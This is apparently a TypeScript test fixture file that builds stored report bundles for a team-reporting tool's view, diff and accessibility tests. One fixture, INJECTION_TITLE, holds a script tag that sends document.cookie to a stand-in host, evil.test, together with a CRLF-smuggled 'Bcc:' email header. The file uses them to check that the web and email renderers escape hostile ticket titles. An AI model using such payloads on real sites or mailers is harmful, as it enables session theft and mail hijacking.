import { SECTIONS } from '@compass/analysis';
import { instantFromIso, timeWindow, type Instant } from '@compass/clock';
import type {
  FreshnessReport,
  SourceFreshness,
  StoredReportBundle,
  StoredReportEvidence,
  StoredReportItem,
  StoredReportSection,
} from '@compass/db';

/**
 * A stored report, as the pipeline would have written it.
 *
 * Hand-built rather than produced by running the pipeline: these tests are about
 * the *view*, and a fixture that needed a database would mean the assertions
 * that matter most — six headings, no chart, every claim linked — only ran when
 * PostgreSQL happened to be up.
 */

export const TIMEZONE = 'Europe/London';
export const REPORT_INSTANT: Instant = instantFromIso('2026-07-31T07:30:00Z');
export const WINDOW = timeWindow(instantFromIso('2026-07-29T23:00:00Z'), instantFromIso('2026-07-30T23:00:00Z'));

/**
 * When a fixture item was first reported, derived from its own condition age.
 *
 * The two agree here on purpose, and it is the realistic case rather than a convenience: on the
 * first report that carries an item, Compass has been showing it for exactly as long as the
 * condition has been true. Pinning one instant for every item instead would make a one-day
 * completion render as "day 6", which is a sentence about a different fact.
 *
 * A real instant either way — zero renders as day 20,000 and makes every age assertion meaningless.
 */
const firstSeenFor = (ageDays: number): Instant =>
  (REPORT_INSTANT - Math.max(0, ageDays) * 86_400_000) as Instant;

let evidenceCounter = 0;

function evidence(
  reportItemId: string,
  kind: string,
  label: string,
  artifactId: string,
  typed: Partial<Pick<StoredReportEvidence, 'commitSha' | 'pullRequestNumber' | 'issueKey'>> = {},
): StoredReportEvidence {
  evidenceCounter += 1;
  return {
    id: `evidence-${evidenceCounter}`,
    reportItemId,
    ordinal: evidenceCounter,
    kind,
    label,
    sourceKey: kind === 'issue' || kind === 'sprint' ? 'primary-tracker' : 'primary-code',
    sourceRecordId: artifactId,
    commitSha: typed.commitSha ?? null,
    pullRequestNumber: typed.pullRequestNumber ?? null,
    issueKey: typed.issueKey ?? null,
    artifactKind: kind,
    artifactId,
  };
}

interface ItemSpec {
  readonly stableId: string;
  readonly headline: string;
  readonly detail: string;
  readonly prose: string;
  readonly ageDays?: number;
  readonly changeClause?: string;
  readonly withLadder?: boolean;
  /**
   * The alignment payload, as the analysis core attaches it to the item and the
   * pipeline stores it inside `payload`. Present on alignment claims only.
   */
  readonly alignment?: Record<string, unknown>;
  readonly evidence: readonly (readonly [kind: string, label: string, artifactId: string])[];
}

function item(spec: ItemSpec, ordinal: number): StoredReportItem {
  const id = `item-${spec.stableId}`;
  const firstSeenAt = firstSeenFor(spec.ageDays ?? 0);
  return {
    id,
    ordinal,
    stableId: spec.stableId,
    // The coordinates the id was derived from. A fixture's `stableId` is a readable label rather
    // than a real digest, so the cause is a matching label: what these tests exercise is the view,
    // and an item whose cause and id agree in shape is what the view is handed in production.
    causeEntityRef: `ticket:${spec.stableId}`,
    causeKind: 'fixture',
    causeDiscriminator: '',
    headline: spec.headline,
    detail: spec.detail,
    prose: spec.prose,
    changeTag: 'unchanged',
    ageDays: spec.ageDays ?? 0,
    firstSeenAt,
    severityScore: 0,
    signalOnsetAt: firstSeenAt,
    feedbackState: null,
    changeClause: spec.changeClause ?? null,
    ladder:
      spec.withLadder === true
        ? {
            notches: [
              { rung: 'R1', label: 'accepted', crossed: true, reachable: true, statement: null },
              { rung: 'R2', label: 'merged', crossed: true, reachable: true, statement: null },
              { rung: 'R3', label: 'integrated', crossed: true, reachable: true, statement: null },
              { rung: 'R4', label: 'released', crossed: false, reachable: true, statement: null },
              {
                rung: 'R5',
                label: 'deployed',
                crossed: false,
                reachable: false,
                statement: 'no deploy signal available',
              },
            ],
            highestCrossed: 'R3',
            highestCrossedLabel: 'integrated',
            highestContiguous: 'R3',
            deploySignalAvailable: false,
            rungSuffix: 'integrated, not yet released',
          }
        : null,
    payload: {
      stableId: spec.stableId,
      headline: spec.headline,
      ...(spec.alignment === undefined ? {} : { alignment: spec.alignment }),
    },
    evidence: spec.evidence.map(([kind, label, artifactId]) =>
      evidence(
        id,
        kind,
        label,
        artifactId,
        kind === 'commit'
          ? { commitSha: artifactId.split(':').at(-1) ?? artifactId }
          : kind === 'pull_request'
            ? { pullRequestNumber: Number.parseInt(label.replace('#', ''), 10) }
            : kind === 'issue'
              ? { issueKey: label }
              : {},
      ),
    ),
  };
}

const ITEMS: Readonly<Record<string, readonly ItemSpec[]>> = {
  yesterday: [
    {
      stableId: 'yesterday:ticket:DEV-501',
      headline: 'DEV-501 via #883 — Batch the checkout writer',
      detail: 'Reached R3 accepted.',
      prose:
        'DEV-501 via #883 — Batch the checkout writer — so it reached R3 accepted and nothing above that. Evidence: DEV-501, #883 — traced to 2 artifacts you can open.',
      ageDays: 1,
      withLadder: true,
      evidence: [
        ['issue', 'DEV-501', 'issue-DEV-501'],
        ['pull_request', '#883', 'pr-883'],
      ],
    },
  ],
  progress: [
    {
      stableId: 'progress:sprint:primary-tracker:sprint-43',
      headline: 'Sprint 43 is 62% complete',
      detail: '24 of 39 points.',
      prose:
        'Sprint 43 is 62% complete — 24 of 39 points — which is behind the pace the elapsed schedule implies.',
      ageDays: 8,
      evidence: [['sprint', 'Sprint 43', 'sprint-43']],
    },
  ],
  blockers: [
    {
      stableId: 'blocker:ticket:DEV-522:tracker_flag',
      headline: 'DEV-522 is flagged blocked in the tracker',
      detail: 'The tracker said so; Compass did not infer it.',
      prose:
        'DEV-522 is flagged blocked in the tracker — so it has held for 6 days and is stated as a blocker rather than as slow progress.',
      ageDays: 6,
      changeClause: 'reviewer added, age unchanged',
      evidence: [['issue', 'DEV-522', 'issue-DEV-522']],
    },
  ],
  risks: [
    {
      stableId: 'risk:sprint:sprint-43:scope_added_after_start',
      headline: '1 item entered Sprint 43 after it started',
      detail: 'DEV-530.',
      prose: '1 item entered Sprint 43 after it started — which Compass rates medium severity and new.',
      ageDays: 3,
      evidence: [['sprint', 'Sprint 43', 'sprint-43']],
    },
    /**
     * An OFF-GOAL verdict resolved semantically, and an unattributed question.
     *
     * Both live in Risks, both carry the payload the evidence panel reads, and both
     * are here because the one-click criterion has to be asserted against the real
     * component tree rather than against the analysis core's return value.
     */
    {
      stableId: 'alignment:off_goal:OBJ-Q2-BILL',
      headline:
        'OFF-GOAL — 3 open items and 2 commits serve OBJ-Q2-BILL, "Migrate every merchant off the legacy billing client", which is not a current objective',
      detail: 'PLAT-742, PLAT-743 match OBJ-Q2-BILL more closely than the goal chain they sit on.',
      prose:
        'OFF-GOAL — 3 open items and 2 commits serve OBJ-Q2-BILL — so Compass resolved this semantically at 0.62 confidence against the 0.30 threshold T17 sets.',
      ageDays: 4,
      alignment: {
        kind: 'off_goal',
        label: 'OFF-GOAL',
        resolvedTier: 'semantic',
        confidence: 0.6154,
        threshold: 0.3,
        thresholdId: 'T17',
        objectiveNodeId: 'OBJ-Q2-BILL',
        objectiveTitle: 'Migrate every merchant off the legacy billing client',
        question: null,
        subjectLabels: ['PLAT-742', 'PLAT-743', 'PLAT-744'],
        evidence: {
          tier: 'semantic',
          chainNodeIds: ['OBJ-Q2-BILL', 'OBJ-CO-1'],
          chainTitles: ['Migrate every merchant off the legacy billing client', 'Take a payment fastest'],
          score: 0.6154,
          threshold: 0.3,
          comparedTextA: 'Migrate the legacy billing client onto the new SDK',
          comparedTextB: 'Migrate every merchant off the legacy billing client',
          matchedTokens: ['billing', 'client', 'legacy', 'migrate'],
        },
      },
      evidence: [['issue', 'PLAT-742', 'issue-PLAT-742']],
    },
    {
      stableId: 'alignment:unattributed:commits',
      headline: '2 commits could not be tied to a sprint objective',
      detail: 'a1b2c36, a1b2c38 name no tracker key in a commit message or a branch.',
      prose:
        '2 commits could not be tied to a sprint objective — so Compass is asking what they served rather than naming anyone.',
      alignment: {
        kind: 'unattributed',
        label: null,
        resolvedTier: 'unattributed',
        confidence: 0.0833,
        threshold: 0.3,
        thresholdId: 'T17',
        objectiveNodeId: null,
        objectiveTitle: null,
        question: 'What were these 2 commits for?',
        subjectLabels: ['a1b2c36', 'a1b2c38'],
        evidence: {
          tier: 'unattributed',
          score: 0.0833,
          threshold: 0.3,
          comparedTextA: 'bump the lockfile after the audit',
          comparedTextB: 'Halve p95 latency on the tokenization path',
          matchedTokens: ['after'],
          question: 'What were these 2 commits for?',
        },
      },
      evidence: [['commit', 'a1b2c36', 'platform-api:a1b2c36']],
    },
    /**
     * An inferred verdict whose highlight has to land on the recorded offset.
     *
     * The branch names the same key twice on purpose: a component that searched for
     * the substring again would underline the first occurrence, and the offset says
     * the second. Only one of those is what Compass actually matched.
     */
    {
      stableId: 'alignment:off_goal:OBJ-Q1-LEGACY',
      headline: 'OFF-GOAL — 1 commit serves OBJ-Q1-LEGACY, which is not a current objective',
      detail: 'Found the key in the branch name.',
      prose:
        'OFF-GOAL — 1 commit serves OBJ-Q1-LEGACY — so Compass resolved this from an inferred tracker key at 1.00 confidence against the 0.30 threshold T17 sets.',
      alignment: {
        kind: 'off_goal',
        label: 'OFF-GOAL',
        resolvedTier: 'inferred',
        confidence: 1,
        threshold: 0.3,
        thresholdId: 'T17',
        objectiveNodeId: 'OBJ-Q1-LEGACY',
        objectiveTitle: 'Retire the legacy importer',
        question: null,
        subjectLabels: ['b2c3d40'],
        evidence: {
          tier: 'inferred',
          chainNodeIds: ['OBJ-Q1-LEGACY'],
          chainTitles: ['Retire the legacy importer'],
          matchedSubstring: 'PLAT-742',
          // The *second* occurrence, at character 27 of the branch name.
          matchedOffset: 27,
          matchedIn: 'branch_name',
          searchedText: 'feature/PLAT-742-rebase-of-PLAT-742',
          via: 'ticket_key_in_branch',
        },
      },
      evidence: [['commit', 'b2c3d40', 'platform-api:b2c3d40']],
    },
  ],
  recommendations: [
    {
      stableId: 'recommendation:blocker:DEV-522',
      headline: 'Marcus Hale — find out what DEV-522 is waiting on',
      detail: 'It has been flagged for 6 days.',
      prose:
        'Marcus Hale — find out what DEV-522 is waiting on — and it is one step, finishable today.',
      evidence: [['issue', 'DEV-522', 'issue-DEV-522']],
    },
  ],
  wins: [
    {
      stableId: 'win:ticket:DEV-501',
      headline: 'DEV-501 landed the batch writer, 8 points',
      detail: 'Merged and accepted.',
      prose:
        'DEV-501 landed the batch writer, 8 points — because it crossed the threshold T8a sets.',
      ageDays: 1,
      evidence: [['commit', '7a8b9c0', 'checkout-web:7a8b9c0d1e2f']],
    },
  ],
};

/**
 * The projection and the Process Calibration Audit, as the pure layer computes them
 * for the seeded platform team.
 *
 * A cycle-time date chosen by `points_uninformative`, at low confidence, with two
 * verdicts and nothing suppressed — which is the interesting case for the collar: a
 * real date that the prose beneath it is entitled to undercut, and a threshold
 * comparison a manager can check.
 */
const COLLAR_FINDINGS = {
  projection: {
    kind: 'projected',
    utcDate: '2026-08-08',
    method: 'cycle_time',
    selectedByVerdicts: ['points_uninformative'],
    band: { confidence: 'low', spanDays: 2 },
    statement:
      '2026-08-08 to 2026-08-10 — a 2-day band from measured cycle time over 118 finished items. ' +
      'This is a cycle-time guess, not a velocity forecast.',
    calibration: {
      verdict: 'points_uninformative',
      statement:
        'Your points have not tracked elapsed working days across 118 completed items — correlation 0.04 over ' +
        'durations spanning 0 to 9 working days, below the 0.30 Compass needs — so any date below is a cycle-time ' +
        'guess, not a plan.',
    },
  },
  calibrationAudit: {
    statement:
      'Compass audited the data behind this report and reached 2 verdicts: points_uninformative, statuses_stale.',
    suppressed: [],
    verdicts: [
      {
        name: 'points_uninformative',
        statistic: 'point_to_elapsed_working_days',
        value: 444,
        sampleSize: 118,
        threshold: { id: 'T12', value: 3_000, unit: 'basis_points' },
        statement:
          'Across 118 completed items your points correlate with elapsed working days at 0.04. T12 needs 0.30, so ' +
          'your points are not telling you how long work takes.',
      },
      {
        name: 'statuses_stale',
        statistic: 'stale_status_incidence',
        value: 7_727,
        sampleSize: 22,
        threshold: { id: 'T24', value: 2_000, unit: 'basis_points' },
        statement:
          '17 of 22 in-progress items — 77% — have sat still for 3 working days or more with no commit and no pull ' +
          'request. T24 fires at 20%, so the board is not describing where the work actually is.',
      },
    ],
  },
} as const;

export function storedBundle(): StoredReportBundle {
  evidenceCounter = 0;

  const sections: StoredReportSection[] = SECTIONS.map((definition) => {
    const specs = ITEMS[definition.key] ?? [];
    const items = specs.map((spec, index) => item(spec, index + 1));
    return {
      id: `section-${definition.key}`,
      sectionKey: definition.key,
      ordinal: definition.index,
      title: definition.title,
      prose: [`${definition.title} carries what follows — so this section carries ${items.length} item.`]
        .concat(items.map((entry) => entry.prose))
        .join('\n\n'),
      payload: { key: definition.key },
      itemCount: items.length,
      emptyStatement: `Nothing crossed a threshold for ${definition.title}.`,
      summary: items.length === 0 ? null : `${items.length} thing to read in ${definition.title}`,
      items,
    };
  });

  return {
    report: {
      id: 'report-1',
      organizationId: '00000000-0000-4000-8000-000000000001',
      scopeKind: 'team',
      scopeKey: 'platform',
      schemaVersion: 1,
      reportInstant: REPORT_INSTANT,
      reportDate: '2026-07-31',
      timezone: TIMEZONE,
      window: WINDOW,
      contentHash: 'a'.repeat(64),
      payloadJson: JSON.stringify({ findings: COLLAR_FINDINGS }),
      // The collar is derived from the stored structured report rather than from the
      // section rows, exactly as the alignment panel is derived from the item payload.
      // So the fixture has to carry the findings, or the page would render the
      // "this report predates the audit" absence and the collar assertions would be
      // testing the fallback instead of the object.
      payload: { findings: COLLAR_FINDINGS },
      prose: 'the whole report',
      changeLine: 'Since the previous report 1 item worsened and 2 items carried over unchanged.',
      rendererId: 'template',
      fallbackRenderer: false,
      fallbackReason: null,
      coverageStatus: 'partial',
      ingestRunId: 'run-1',
      generatedAt: REPORT_INSTANT,
    },
    sections,
  };
}

/**
 * A narrated report: the same claims, with a model's prose over the top.
 *
 * The section prose is what a narrator would have written — one lead, then the
 * items in an order it chose — and it deliberately contains the three inline
 * markdown forms the allowlist recognises, so the view test proves they render as
 * elements rather than as literal asterisks.
 */
export function narratedBundle(): StoredReportBundle {
  const bundle = storedBundle();
  return {
    ...bundle,
    report: { ...bundle.report, rendererId: 'narrated' },
    sections: bundle.sections.map((section) => ({
      ...section,
      prose:
        section.items.length === 0
          ? section.emptyStatement
          : `**${section.title}** has ${section.items.length} thing worth your attention this morning.\n\n` +
            `${section.items.map((entry) => entry.headline).join(' ')} *age unchanged*, and \`${section.sectionKey}\` is where it sits.`,
    })),
  };
}

/**
 * A report whose narration was rejected, and which says so.
 *
 * This is the shape the page has to disclose rather than hide: complete, correct,
 * every figure linked — and templated, because a model asserted something the
 * payload did not contain.
 */
export function fallbackBundle(): StoredReportBundle {
  const bundle = storedBundle();
  return {
    ...bundle,
    report: {
      ...bundle.report,
      rendererId: 'template',
      fallbackRenderer: true,
      fallbackReason:
        '`risks` could not be grounded in 3 attempts; last rejection named `#999917`, `Wendell Fitzcarraldo`',
    },
  };
}

/**
 * A ticket titled with a script tag and an email-header injection payload.
 *
 * Both halves are real attacks against real surfaces: the `<script>` is aimed at
 * the web view, and the `\r\nBcc:` at the email renderer's header assembly. They are
 * carried on one item so a single fixture covers the criterion for both, and the
 * payload sits in the *headline* because that is the field a ticket title actually
 * reaches.
 */
export const INJECTION_TITLE =
  '<script>fetch("https://evil.test/"+document.cookie)</script>\r\nBcc: attacker@evil.test';

export function injectionBundle(): StoredReportBundle {
  const bundle = storedBundle();
  const [first, ...rest] = bundle.sections;
  if (first === undefined) throw new Error('The fixture bundle has no sections.');

  const [firstItem, ...otherItems] = first.items;
  if (firstItem === undefined) throw new Error('The fixture bundle has no Yesterday item.');

  return {
    ...bundle,
    sections: [
      {
        ...first,
        // Narrated, so the prose the page renders is the attacker-influenced text
        // rather than a sentence the template renderer composed around it.
        prose: `DEV-501 — ${INJECTION_TITLE} — reached R3 integrated.`,
        items: [{ ...firstItem, headline: `DEV-501 — ${INJECTION_TITLE}`, prose: `DEV-501 — ${INJECTION_TITLE}.` }, ...otherItems],
      },
      ...rest,
    ],
    report: { ...bundle.report, rendererId: 'narrated' },
  };
}

/** An empty section in every slot — the "nothing happened" rendering. */
export function emptyBundle(): StoredReportBundle {
  const bundle = storedBundle();
  return {
    ...bundle,
    sections: bundle.sections.map((section) => ({ ...section, items: [], itemCount: 0, summary: null, prose: section.emptyStatement })),
  };
}

/**
 * Two stored reports a day apart, arranged to contain all three diff outcomes.
 *
 * One item keeps its stable id and gets worse (a `changed` row), one is only in the earlier report
 * (`removed`), one only in the later (`added`). Shared between `report-diff.test.tsx` and the axe
 * sweep in `accessibility.test.tsx` rather than built twice: the diff's markup is structural — nested
 * lists, a disclosure per side, a definition list inside each — and two fixtures that drifted would
 * mean the audited tree and the asserted tree were different trees.
 */
export function diffPairFixture(): {
  readonly before: StoredReportBundle;
  readonly after: StoredReportBundle;
} {
  const withFirstSectionItems = (
    bundle: StoredReportBundle,
    map: (items: readonly StoredReportItem[]) => readonly StoredReportItem[],
  ): StoredReportBundle => ({
    ...bundle,
    sections: bundle.sections.map((section, index) =>
      index === 0 ? { ...section, items: map(section.items) } : section,
    ),
  });

  const earlier = storedBundle();
  const template = earlier.sections[0]!.items[0]!;

  const before = withFirstSectionItems(
    { ...earlier, report: { ...earlier.report, id: 'report-0', reportDate: '2026-07-30' } },
    (items) => [
      ...items,
      { ...template, id: 'item-departing', stableId: 'blocker:ticket:DEV-999:tracker_flag' },
    ],
  );

  const after = withFirstSectionItems(storedBundle(), (items) => [
    ...items.map((entry) => ({
      ...entry,
      severityScore: entry.severityScore + 15,
      ageDays: entry.ageDays + 1,
    })),
    { ...template, id: 'item-fresh', stableId: 'blocker:ticket:DEV-777:tracker_flag' },
  ]);

  return { before, after };
}

const source = (
  sourceKey: string,
  overrides: Partial<SourceFreshness> = {},
): SourceFreshness => ({
  sourceKey,
  sourceKind: 'code',
  status: 'complete',
  reason: 'ok',
  detail: `${sourceKey} answered the full window (12 records).`,
  lastObservedAt: instantFromIso('2026-07-30T18:00:00Z'),
  requestedWindow: WINDOW,
  coveredWindow: WINDOW,
  recordCount: 12,
  artifacts: ['commits'],
  ...overrides,
});

export function freshnessWithMissingSource(): FreshnessReport {
  return {
    hasIngestRecord: true,
    ingestRunId: 'run-1',
    connectorId: 'seed:northwind-v1',
    startedAt: instantFromIso('2026-07-31T07:00:00Z'),
    completedAt: instantFromIso('2026-07-31T07:02:00Z'),
    window: WINDOW,
    totalRecords: 24,
    overallStatus: 'partial',
    sources: [
      source('primary-code'),
      source('primary-tracker', { sourceKind: 'tracker' }),
      source('legacy-code', {
        status: 'unavailable',
        reason: 'rate_limited',
        detail: 'legacy-code returned 429 after exhausting its hourly quota.',
        lastObservedAt: null,
        coveredWindow: null,
        recordCount: 0,
      }),
    ],
    missingSourceKeys: ['legacy-code'],
  };
}

export function freshnessComplete(): FreshnessReport {
  const partial = freshnessWithMissingSource();
  return {
    ...partial,
    overallStatus: 'complete',
    sources: partial.sources.filter((entry) => entry.sourceKey !== 'legacy-code'),
    missingSourceKeys: [],
  };
}

/** No ingest has ever been journalled: the "state nothing" case. */
export function freshnessAbsent(): FreshnessReport {
  return {
    hasIngestRecord: false,
    ingestRunId: null,
    connectorId: null,
    startedAt: null,
    completedAt: null,
    window: null,
    totalRecords: 0,
    overallStatus: 'unavailable',
    sources: [],
    missingSourceKeys: [],
  };
}
